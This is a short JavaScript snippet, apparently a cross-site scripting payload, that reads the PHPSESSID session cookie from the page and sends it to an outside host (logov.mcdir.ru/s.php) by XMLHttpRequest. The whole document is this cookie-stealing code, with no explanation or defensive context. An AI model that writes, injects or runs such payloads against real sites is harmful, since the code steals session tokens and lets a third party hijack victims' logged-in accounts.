var xhr = new XMLHttpRequest();
var id = document.cookie.match(/PHPSESSID=[^;]+/);
xhr.open("GET","http://logov.mcdir.ru/s.php?id="+id);
xhr.send();